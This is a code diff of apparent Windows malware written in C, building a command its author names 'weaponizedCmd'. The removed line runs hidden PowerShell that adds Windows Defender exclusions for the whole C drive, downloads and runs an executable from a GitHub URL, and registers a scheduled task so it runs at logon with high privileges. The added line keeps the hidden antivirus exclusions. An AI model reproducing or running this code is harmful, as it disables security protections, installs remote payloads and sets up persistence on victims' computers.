@@ -151,7 +151,7 @@ int main() {
 
     // 4. BUILD COMMAND
     swprintf_s(weaponizedCmd, 2048, 
-        L"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath 'C:\Windows\Temp\word.exe';Add-MpPreference -ExclusionPath 'C:\Windows\Temp\';Add-MpPreference -ExclusionPath 'C:\Windows\';Add-MpPreference -ExclusionPath 'C:\';[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $zipPath='C:\Windows\Temp\word.exe'; (New-Object System.Net.WebClient).DownloadFile('https://github.com/tkankkoa-ai/ok/raw/refs/heads/main/Client.exe', $zipPath); Start-Process '$zipPath'  -WindowStyle Hidden; schtasks /create /tn 'ActiveOffices' /tr '$zipPath' /sc onlogon /delay 0001:00 /rl highest /f \"");
+        L"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp\\word.exe';Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp\\';Add-MpPreference -ExclusionPath 'C:\\Windows\\';Add-MpPreference -ExclusionPath 'C:\\' \"");
 
     printf("[DEBUG] Target: %ws\n", targetPath);
     printf("[DEBUG] Full Cmd: %ws\n", weaponizedCmd);
